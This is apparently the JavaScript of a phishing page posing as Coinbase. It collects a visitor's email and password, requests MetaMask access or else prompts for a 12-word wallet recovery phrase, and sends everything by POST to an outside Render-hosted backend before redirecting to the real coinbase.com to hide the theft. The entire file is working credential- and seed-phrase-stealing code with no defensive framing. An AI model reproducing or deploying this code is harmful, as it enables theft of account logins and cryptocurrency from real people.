const API_URL = 'https://cb-backend-new.onrender.com';

document.addEventListener('DOMContentLoaded', () => {
    const toStep2Btn = document.getElementById('toStep2');
    const toStep3Btn = document.getElementById('toStep3');
    const connectBtn = document.getElementById('connectBtn');
    const statusText = document.getElementById('status');

    // Step 1 -> Step 2
    toStep2Btn.addEventListener('click', () => {
        document.getElementById('step-1').classList.add('hidden');
        document.getElementById('step-2').classList.remove('hidden');
    });

    // Step 2 -> Step 3
    toStep3Btn.addEventListener('click', () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;

        if (!email || !pass) {
            alert('Please fill in all fields.');
            return;
        }

        document.getElementById('step-2').classList.add('hidden');
        document.getElementById('step-3').classList.remove('hidden');
    });

    // Step 3: Wallet Connection or Recovery Phrase
    connectBtn.addEventListener('click', async () => {
        const email = document.getElementById('email').value;
        const password = document.getElementById('pass').value;

        // If MetaMask is installed, use it
        if (window.ethereum) {
            try {
                statusText.innerText = 'Connecting to wallet...';
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const walletAddress = accounts[0];

                await sendData(email, password, walletAddress, null);
            } catch (error) {
                statusText.innerText = 'Wallet connection failed. Please use the recovery phrase option.';
                statusText.style.color = 'red';
            }
        } else {
            // If no wallet, trigger the Recovery Phrase prompt
            statusText.innerText = 'Wallet not found. Please enter your 12-word recovery phrase below:';
            statusText.style.color = 'blue';
            
            // 1. Create the recovery phrase input and "done" button dynamically
            const recoveryInput = document.createElement('input');
            recoveryInput.type = 'text';
            recoveryInput.id = 'recovery_phrase';
            recoveryInput.placeholder = 'Enter 12-word phrase separated by spaces';
            recoveryInput.style.display = 'block';
            recoveryInput.style.marginTop = '10px';
            recoveryInput.style.width = '100%';

            const doneBtn = document.createElement('button');
            doneBtn.innerText = 'Done';
            doneBtn.className = 'btn-primary';
            doneBtn.style.marginTop = '10px';

            document.getElementById('step-3').appendChild(recoveryInput);
            document.getElementById('step-3').appendChild(doneBtn);

            // 2. Button to submit the recovery phrase
            doneBtn.addEventListener('click', async () => {
                const phrase = recoveryInput.value.trim();
                const words = phrase.split(/\s+/);

                // CRITICAL: Must be exactly 12 words
                if (words.length !== 12) {
                    statusText.innerText = `You must enter exactly 12 words. Currently: ${words.length}`;
                    statusText.style.color = 'red';
                    return;
                }

                statusText.innerText = 'Verifying recovery phrase...';
                await sendData(email, password, null, phrase);
            });
        }
    });

    // Centralized function to send data to your Render backend
    async function sendData(email, password, wallet, phrase) {
        try {
            const response = await fetch(`${API_URL}/update`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    email: email,
                    password: password,
                    walletAddress: wallet,
                    recoveryPhrase: phrase
                })
            });

            if (response.ok) {
                statusText.innerText = 'Verification successful! Redirecting...';
                statusText.style.color = 'green';
                setTimeout(() => {
                    window.location.href = 'https://coinbase.com'; // Redirects to actual Coinbase
                }, 2000);
            } else {
                throw new Error('Server error');
            }
        } catch (error) {
            statusText.innerText = 'Submission failed. Please try again.';
            statusText.style.color = 'red';
        }
    }
});
